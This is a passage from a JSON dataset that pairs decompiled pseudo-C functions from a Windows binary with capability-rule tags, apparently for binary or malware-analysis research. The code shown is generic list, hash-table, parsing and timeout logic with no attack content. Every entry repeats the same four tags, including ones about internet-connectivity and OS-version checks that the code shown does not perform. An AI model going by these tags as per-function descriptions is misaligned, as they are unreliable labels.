        "decompiled_code": "\nint32_t * __cdecl fcn.0006bae0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0xb8) < 10) {\n        iVar2 = fcn.000356c0(arg_ch);\n        if (iVar2 == 0) {\n            piVar1 = NULL;\n        }\n        else {\n            piVar1 = arg_8h + 0x18 + *(arg_8h + 0xb8) * 0x10;\n            *(arg_8h + 0xb8) = *(arg_8h + 0xb8) + 1;\n            if (arg_10h == 0) {\n                *piVar1 = *(arg_8h + 0xbc);\n                *(arg_8h + 0xbc) = piVar1;\n                if (*piVar1 == 0) {\n                    *(arg_8h + 0xc0) = piVar1;\n                }\n            }\n            else if (*(arg_8h + 0xc0) == 0) {\n                *(arg_8h + 0xbc) = piVar1;\n                *(arg_8h + 0xc0) = piVar1;\n            }\n            else {\n                **(arg_8h + 0xc0) = piVar1;\n                *(arg_8h + 0xc0) = piVar1;\n            }\n            piVar1[1] = iVar2;\n            piVar1[2] = arg_ch;\n        }\n    }\n    else {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 398
    },
    "0006bc30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006bc30(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x24) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            var_14h = 0x21590001;\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            var_1ch = 0;\n            var_20h = *(arg_8h + 0xc);\n            var_18h = 3;\n            fcn.000270a0(&var_20h);\n            var_4h = 0;\n            var_8h = 0xc;\n            var_ch = &var_20h;\n            var_10h = arg_ch;\n            var_14h = fcn.00076cb0(*(*(arg_8h + 4) + 0xc), &var_10h, 0);\n            if (var_14h == 0x21590003) {\n                var_14h = 0x21590006;\n            }\n        }\n        else {\n            var_14h = *(arg_8h + 0x14);\n        }\n    }\n    else {\n        var_14h = 0x21590006;\n    }\n    return var_14h;\n}\n",
        "token_count": 370
    },
    "0006bee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0006bee0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    var_ch = fcn.00077960(*arg_8h);\n    while( true ) {\n        do {\n            iVar1 = fcn.00078a6e();\n            var_8h = fcn.00077b60(var_4h[1], var_4h[2], &var_14h, &var_10h, iVar1 % 6000 + 2000, 0);\n            if ((var_8h != 0) && (var_4h[3] != 0)) {\n                var_8h = 0x21590006;\n            }\n        } while (var_8h == 0x21590002);\n        if (var_8h != 0) break;\n        var_8h = (**(var_ch + 0xc))(*var_4h, var_14h, var_10h, 0);\n        fcn.00077e50(var_4h[1], var_14h);\n        if (var_8h != 0) {\ncode_r0x0006bfb3:\n            var_4h[3] = 1;\n            return 0;\n        }\n    }\n    if ((var_8h != 0x21590006) && (var_4h[3] == 0)) {\n        fcn.00077ed0(var_4h[1], var_4h[2]);\n    }\n    goto code_r0x0006bfb3;\n}\n",
        "token_count": 477
    },
    "0006bfd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006bfd0(uint *arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    var_ch = fcn.00077960(*arg_8h);\n    while( true ) {\n        do {\n            var_8h = (**(var_ch + 8))(*var_4h, &var_14h, &var_10h, 100, 0);\n            if ((var_8h != 0) && (var_4h[3] != 0)) {\n                var_8h = 0x21590006;\n            }\n        } while (var_8h == 0x21590002);\n        if (var_8h != 0) break;\n        var_8h = fcn.00077c70(var_4h[1], var_4h[2], var_14h, var_10h, 0);\n        (**(var_ch + 4))(*var_4h, var_14h, 0);\n        if (var_8h != 0) {\ncode_r0x0006c08c:\n            var_4h[3] = 1;\n            return 0;\n        }\n    }\n    if (var_4h[3] == 0) {\n        fcn.00077ed0(var_4h[1], var_4h[2]);\n    }\n    goto code_r0x0006c08c;\n}\n",
        "token_count": 359
    },
    "0006c0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006c0a0(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    int32_t var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    \n    fcn.00078bfa(&var_150h, 0, 0x150);\n    var_134h = *arg_ch;\n    var_130h = arg_ch[1];\n    var_168h = 0;\n    var_164h = 0;\n    var_160h = 0;\n    var_15ch = 0;\n    var_154h = 0;\n    var_158h = &var_150h;\n    var_15ch = fcn.0006a530(arg_8h, arg_ch[2]);\n    if (var_15ch == 0) {\n        iVar1 = 0x21590003;\n    }\n    else {\n        do {\n            iVar1 = fcn.0006b620(&var_168h);\n        } while (iVar1 == 0);\n        fcn.0006a5a0(arg_8h, arg_ch[2], 1);\n    }\n    return iVar1;\n}\n",
        "token_count": 320
    },
    "0006c170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006c170(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x168);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x168);\n        *(arg_8h_00 + 4) = 0x800a9860;\n        *(arg_8h_00 + 8) = 0x800a97f0;\n        *(arg_8h_00 + 0xc) = 0x800aa230;\n        *(arg_8h_00 + 0x10) = 0x800aa320;\n        iVar2 = fcn.00077500(arg_8h_00, 0x800b9360);\n        if (iVar2 == 0) {\n            fcn.000357f0(arg_8h_00);\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.000349b0(arg_8h_00 + 0x44);\n            fcn.00036ed0(arg_8h_00 + 0x1c);\n            *(arg_8h_00 + 0x15c) = 1;\n            *(arg_8h_00 + 0x160) = *(*(arg_8h + 4) + 0xc);\n            fcn.00076a80(*(*(arg_8h + 4) + 0xc), *(arg_8h + 200));\n            *(*(arg_8h + 4) + 0xc) = 0;\n            *(arg_8h + 200) = 0;\n            *arg_ch = 0;\n            arg_ch[1] = 0;\n            *arg_ch = arg_8h_00;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 491
    },
    "0006c390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0006c390(void)\n\n{\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    if (*0x800da9c8 != 0) {\n        fcn.00034570(0x800cdafc);\n        fcn.00037760(0x800cdaf4, &var_ch);\n        fcn.00037710(0x800cdaf4);\n        fcn.00034540(0x800cdafc);\n        fcn.00036f70(0x800cdb00);\n        var_4h = *0x800cdb10;\n        while (var_4h != NULL) {\n            fcn.000761d0(var_4h + 2, 0);\n            fcn.00034a10(var_4h + 3);\n            fcn.00034a80(var_4h + 3);\n            fcn.000349e0(var_4h + 3);\n            var_8h = *var_4h;\n            fcn.000357f0(var_4h);\n            var_4h = var_8h;\n        }\n        *0x800cdb10 = NULL;\n        fcn.00037020(0x800cdb00);\n        fcn.00036f40(0x800cdb00);\n        *0x800da9c8 = 0;\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "0006c470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006c470(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_ch_00;\n    uint32_t uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    char var_dh;\n    int32_t var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_18h = 0;\ncode_r0x0006c484:\n    do {\n        if (arg_ch <= var_18h) {\n            return 0;\n        }\n        iVar1 = fcn.00078b7c(arg_8h + var_18h, 0xd, (arg_ch - var_18h) + -1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*(iVar1 + 1) != '\\n') {\n            return 0;\n        }\n        var_4h = iVar1 - (arg_8h + var_18h);\n        if (var_4h == 0) {\n            return 0;\n        }\n        var_ch = fcn.00078b7c(arg_8h + var_18h, 0x3a, var_4h + -1);\n        if (var_ch == 0) {\n            return 0;\n        }\n        if (*(var_ch + 1) != ' ') {\n            return 0;\n        }\n        var_ch = var_ch + 2;\n        var_4h = iVar1 - var_ch;\n        if (((var_4h < 0x1a) || (iVar2 = fcn.00037c60(var_ch, 0x16, &var_20h),  iVar2 == 0)) || (var_20h != *0x800b945c)\n           ) {\n            if (((var_4h < 0xe) || (iVar2 = fcn.00037dc0(var_ch),  iVar2 == 0)) || (*0x800b91ec == 0)) {\n                var_18h = (iVar1 - arg_8h) + 2;\n                goto code_r0x0006c484;\n            }\n            var_ch = var_ch + 10;\n            var_4h = var_4h - 10;\n        }\n        else {\n            var_ch = var_ch + 0x16;\n            var_4h = var_4h - 0x16;\n        }\n        arg_ch_00 = fcn.000356f0(var_4h);\n        if (arg_ch_00 == NULL) {\n            return 0;\n        }\n        uVar3 = fcn.000347a0(var_ch, arg_ch_00, var_4h);\n        if ((uVar3 != 0xffffffff) && (3 < uVar3)) {\n            *arg_10h = *arg_ch_00;\n            arg_10h[1] = arg_ch_00[1];\n            fcn.0006c2d0(arg_10h);\n            var_8h = arg_10h;\n            var_dh = '\\0';\n            for (var_14h = 0; var_14h < 7; var_14h = var_14h + 1) {\n                var_dh = var_dh + *var_8h;\n                var_8h = var_8h + 1;\n            }\n            if (*(arg_10h + 7) == var_dh) {\n                *arg_14h = arg_ch_00;\n                *arg_18h = uVar3;\n                return 1;\n            }\n        }\n        fcn.000357f0(arg_ch_00);\n        var_18h = (iVar1 - arg_8h) + 2;\n    } while( true );\n}\n",
        "token_count": 915
    },
    "0006c680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0006c680(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint32_t var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_24h = 0;\n    var_18h = NULL;\n    if ((arg_10h == 0) && (arg_18h != 0)) {\n        arg_ch = 0;\n    }\n    if ((*(arg_8h + 6) & 1) == 0) {\n        var_ch = *arg_8h;\n    }\n    else {\n        var_28h = fcn.0006ca00(&fcn.0006c680::var_ch, arg_14h, *(arg_8h + 6), arg_ch, arg_10h);\n        if (var_28h != 0) goto code_r0x0006c9b5;\n    }\n    fcn.00036f70(0x800cdb00);\n    var_1ch = NULL;\n    for (var_18h = *0x800cdb10; (var_18h != NULL && (var_18h[1] != var_ch)); var_18h = *var_18h) {\n        var_1ch = var_18h;\n    }\n    if (var_18h == NULL) {\n        fcn.00037020(0x800cdb00);\n        var_28h = 6;\n    }\n    else if ((*(arg_8h + 6) & 8) == 0) {\n        fcn.00034a10(var_18h + 3);\n        fcn.00037020(0x800cdb00);\n        uVar1 = fcn.00026ff0();\n        var_18h[6] = uVar1;\n        if ((*(arg_8h + 6) & 2) == 0) {\n            if (arg_ch == 0) {\n                var_28h = fcn.0004adb0(arg_1ch, arg_18h, &fcn.0006c680::var_8h, &fcn.0006c680::arg_10h);\n                if (var_28h != 0) goto code_r0x0006c9b5;\n                arg_ch = var_8h;\n            }\n            else {\n                var_8h = 0;\n            }\n            var_28h = fcn.000767a0(0x6c842, arg_ch, arg_10h, 0);\n            fcn.000357f0(var_8h);\n            if (var_28h != 0) goto code_r0x0006c9b5;\n        }\n        var_30h = 0;\n        var_2ch = 0;\n        if ((*(arg_8h + 6) & 4) == 0) {\n            var_24h = 0;\n            var_20h = 0;\n            var_2ch._2_2_ = 2;\n        }\n        else {\n            iVar2 = fcn.00026ff0();\n            var_28h = fcn.00076860(var_18h[2], &fcn.0006c680::var_24h, &fcn.0006c680::var_20h, var_18h[4], 0);\n            iVar3 = fcn.00026ff0();\n            if (var_28h == 0x21590002) {\n                var_24h = 0;\n                var_20h = 0;\n                var_2ch._0_3_ = CONCAT12(2, var_2ch);\n                var_2ch = var_2ch & 0xff000000 | var_2ch;\n                uVar4 = fcn.00078a6e();\n                var_18h[4] = uVar4 % var_18h[5] + var_18h[4];\n            }\n            else {\n                if (var_28h != 0) goto code_r0x0006c9b5;\n                var_18h[4] = var_18h[4] + (iVar3 - iVar2) >> 1;\n            }\n            if (*0x800b9154 < var_18h[4]) {\n                var_18h[4] = *0x800b90b4;\n            }\n        }\n        if ((*(arg_8h + 6) & 1) != 0) {\n            var_2ch._2_2_ = var_2ch._2_1_ | 1;\n        }\n        var_30h = var_ch;\n        var_2ch = CONCAT22(var_2ch._2_2_, *(arg_8h + 1));\n        var_4h = &fcn.0006c680::var_30h;\n        var_dh = 0;\n        for (var_14h = 0; var_14h < 7; var_14h = var_14h + 1) {\n            var_dh = var_dh + *var_4h;\n            var_4h = var_4h + 1;\n        }\n        var_2ch = var_2ch & 0xffffff | var_dh << 0x18;\n        var_28h = fcn.0004aea0(arg_1ch, &fcn.0006c680::var_30h, var_24h, var_20h);\n        uVar1 = fcn.00026ff0();\n        var_18h[6] = uVar1;\n    }\n    else {\n        if (var_1ch == NULL) {\n            *0x800cdb10 = *var_18h;\n        }\n        else {\n            *var_1ch = *var_18h;\n        }\n        fcn.00037020(0x800cdb00);\n        fcn.00034a10(var_18h + 3);\n        fcn.000761d0(var_18h + 2, 0);\n        fcn.00034a80(var_18h + 3);\n        fcn.000349e0(var_18h + 3);\n        fcn.000357f0(var_18h);\n        var_18h = NULL;\n        var_28h = 0x4ca;\n    }\ncode_r0x0006c9b5:\n    if (var_18h != NULL) {\n        fcn.00076a80(var_18h[2], var_24h);\n        fcn.00034a80(var_18h + 3);\n    }\n    if (var_28h != 0) {\n        fcn.0004b0e0(arg_1ch, var_28h);\n    }\n    return var_28h;\n}\n",
        "token_count": 1677
    },
    "0006ca00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006ca00(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint *arg_14h, char *arg_18h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uchar uVar3;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    uint uVar6;\n    char *pcVar7;\n    uint var_1f8h;\n    uint var_1f0h;\n    uint *var_1ech;\n    uint var_1e8h;\n    uint var_1e0h;\n    uint *var_1dch;\n    uint var_1d8h;\n    uint var_1d0h;\n    uint *var_1cch;\n    uint var_1c8h;\n    uint var_1c0h;\n    uint *var_1bch;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint *var_1ach;\n    uint *var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint *var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint *var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar4 = (arg_10h & 0x30) >> 4;\n    arg_8h_00 = fcn.000356c0(0x1c);\n    if (arg_8h_00 == NULL) {\n        iVar5 = 0x21590004;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        fcn.000349b0(arg_8h_00 + 3);\n        arg_8h_00[4] = *0x800b90b4;\n        arg_8h_00[5] = *0x800b919c;\n        do {\n            uVar3 = fcn.00078a6e();\n            *arg_8h = uVar3;\n            uVar3 = fcn.00078a6e();\n            *(arg_8h + 1) = uVar3;\n            uVar3 = fcn.00078a6e();\n            *(arg_8h + 2) = uVar3;\n            uVar3 = fcn.00078a6e();\n            *(arg_8h + 3) = uVar3;\n            fcn.00036f70(0x800cdb00);\n            for (var_10ch = *0x800cdb10; (var_10ch != NULL && (var_10ch[1] != *arg_8h)); var_10ch = *var_10ch) {\n            }\n            fcn.00037020(0x800cdb00);\n        } while (var_10ch != NULL);\n        arg_8h_00[1] = *arg_8h;\n        if (arg_18h == NULL) {\n            var_8h = 0x80055434;\n        }\n        else {\n            var_8h = arg_14h;\n            var_1ach = arg_14h;\n            pcVar7 = arg_14h + 1;\n            do {\n                cVar1 = *var_1ach;\n                var_1ach = var_1ach + 1;\n            } while (cVar1 != '\\0');\n            if (arg_18h < var_1ach + (1 - pcVar7)) {\n                fcn.000357f0(arg_8h_00);\n                return 0x21590065;\n            }\n            arg_14h = arg_14h + var_1ach + (1 - pcVar7);\n            arg_18h = arg_18h + -(var_1ach + (1 - pcVar7));\n        }\n        var_4h = 0;\n        if (arg_18h == NULL) {\n            fcn.0002c3f0(&var_190h, 0x80);\n            if (uVar4 != 0) {\n                puVar2 = &var_190h;\n                do {\n                    var_1cch = puVar2;\n                    puVar2 = var_1cch + 1;\n                } while (*var_1cch != '\\0');\n                fcn.00078ad4(var_1cch, 0x800545f0, uVar4);\n            }\n            var_19ch = &var_190h;\n        }\n        else {\n            var_19ch = arg_14h;\n            var_1bch = arg_14h;\n            do {\n                cVar1 = *var_1bch;\n                var_1bch = var_1bch + 1;\n            } while (cVar1 != '\\0');\n            pcVar7 = var_1bch - (arg_14h + 1);\n            if (arg_18h < pcVar7) {\n                fcn.000357f0(arg_8h_00);\n                return 0x21590066;\n            }\n            arg_14h = arg_14h + pcVar7 + 1;\n            arg_18h = arg_18h + -(pcVar7 + 1);\n        }\n        var_1dch = var_19ch;\n        do {\n            cVar1 = *var_1dch;\n            var_1dch = var_1dch + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = fcn.00075eb0(arg_8h_00 + 2, &var_8h, 0, 0, var_19ch, var_1dch + (1 - (var_19ch + 1)), 2);\n        if (iVar5 == 0) {\n            if (arg_18h == NULL) {\n                iVar5 = fcn.00078a44(arg_ch, 0x3d);\n                if (iVar5 != 0) {\n                    fcn.000761d0(arg_8h_00 + 2, 0);\n                    fcn.000357f0(arg_8h_00);\n                    return 0x21590064;\n                }\n                fcn.0002c4c0(&var_108h, 0x100, 0x800558bc, arg_ch);\n                var_1a8h = &var_108h;\n            }\n            else {\n                var_1a8h = arg_14h;\n                var_1ech = arg_14h;\n                do {\n                    cVar1 = *var_1ech;\n                    var_1ech = var_1ech + 1;\n                } while (cVar1 != '\\0');\n                if (arg_18h < var_1ech - (arg_14h + 1)) {\n                    fcn.000357f0(arg_8h_00);\n                    return 0x21590067;\n                }\n            }\n            iVar5 = fcn.000766e0(arg_8h_00[2], var_1a8h, 0);\n            if (iVar5 == 0) {\n                iVar5 = fcn.00076560(arg_8h_00[2], 0);\n                if (iVar5 == 0) {\n                    uVar6 = fcn.00026ff0();\n                    arg_8h_00[6] = uVar6;\n                    fcn.00037100(0x800cdb00);\n                    *arg_8h_00 = *0x800cdb10;\n                    *0x800cdb10 = arg_8h_00;\n                    fcn.00037190(0x800cdb00);\n                    iVar5 = 0;\n                }\n                else {\n                    fcn.000761d0(arg_8h_00 + 2, 0);\n                    fcn.000357f0(arg_8h_00);\n                }\n            }\n            else {\n                fcn.000761d0(arg_8h_00 + 2, 0);\n                fcn.000357f0(arg_8h_00);\n            }\n        }\n        else {\n            fcn.000357f0(arg_8h_00);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1942
    },
    "0006cff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0006cff0(void)\n\n{\n    int32_t iVar1;\n    uint *var_8h;\n    uint *var_4h;\n    \ncode_r0x0006cff6:\n    iVar1 = fcn.000345a0(0x800cdafc, 60000);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    do {\n        fcn.00037100(0x800cdb00);\n        var_8h = NULL;\n        for (var_4h = *0x800cdb10; var_4h != NULL; var_4h = *var_4h) {\n            iVar1 = fcn.00026ff0();\n            if (900000 < iVar1 - var_4h[6]) {\n                if (var_8h == NULL) {\n                    *0x800cdb10 = *var_4h;\n                }\n                else {\n                    *var_8h = *var_4h;\n                }\n                break;\n            }\n            var_8h = var_4h;\n        }\n        fcn.00037190(0x800cdb00);\n        if (var_4h == NULL) goto code_r0x0006cff6;\n        fcn.00034a10(var_4h + 3);\n        fcn.000761d0(var_4h + 2, 0);\n        fcn.00034a80(var_4h + 3);\n        fcn.000349e0(var_4h + 3);\n        fcn.000357f0(var_4h);\n    } while( true );\n}\n",
        "token_count": 356
    },
    "0006d0f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0006d0f0(void)\n\n{\n    uint *puVar1;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00034a10(0x800cdb14);\n    for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n        var_ch = *(var_8h * 4 + -0x7ff324e8);\n        while (var_ch != NULL) {\n            puVar1 = *var_ch;\n            fcn.000357f0(var_ch);\n            var_ch = puVar1;\n        }\n        *(var_8h * 4 + -0x7ff324e8) = 0;\n    }\n    fcn.00034a80(0x800cdb14);\n    fcn.000349e0(0x800cdb14);\n    return;\n}\n",
        "token_count": 214
    },
    "0006d170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006d170(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = ((arg_8h >> 5) + arg_ch) % 0x40;\n    puVar1 = fcn.000356c0(0xc);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[1] = arg_8h;\n        puVar1[2] = arg_ch;\n        fcn.00034a10(0x800cdb14);\n        *puVar1 = *(uVar2 * 4 + -0x7ff324e8);\n        *(uVar2 * 4 + -0x7ff324e8) = puVar1;\n        fcn.00034a80(0x800cdb14);\n    }\n    return puVar1 != NULL;\n}\n",
        "token_count": 248
    },
    "0006d200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006d200(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_ch = 0;\n    uVar1 = ((arg_8h >> 5) + arg_ch) % 0x40;\n    fcn.00034a10(0x800cdb14);\n    var_4h = NULL;\n    var_10h = *(uVar1 * 4 + -0x7ff324e8);\n    do {\n        if (var_10h == NULL) {\ncode_r0x0006d2a4:\n            fcn.00034a80(0x800cdb14);\n            return var_ch;\n        }\n        if ((var_10h[1] == arg_8h) && (var_10h[2] == arg_ch)) {\n            if (var_4h == NULL) {\n                *(uVar1 * 4 + -0x7ff324e8) = *var_10h;\n            }\n            else {\n                *var_4h = *var_10h;\n            }\n            fcn.000357f0(var_10h);\n            var_ch = 1;\n            goto code_r0x0006d2a4;\n        }\n        var_4h = var_10h;\n        var_10h = *var_10h;\n    } while( true );\n}\n",
        "token_count": 338
    },
    "0006d2c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006d2c0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00034a10(0x800cdb14);\n    var_ch = *((((arg_8h >> 5) + arg_ch) % 0x40) * 4 + -0x7ff324e8);\n    do {\n        if (var_ch == NULL) {\ncode_r0x0006d32a:\n            fcn.00034a80(0x800cdb14);\n            return var_8h;\n        }\n        if ((var_ch[1] == arg_8h) && (var_ch[2] == arg_ch)) {\n            var_8h = 1;\n            goto code_r0x0006d32a;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 220
    },
    "0006d340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006d340(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = fcn.000356c0(0x14);\n    if (var_4h == NULL) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00073ce0(var_4h + 1, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h & 3 | 0x10000);\n        if (iVar1 == 0) {\n            fcn.000349b0(var_4h + 2);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 334
    },
    "0006d440": {
        "rules": [
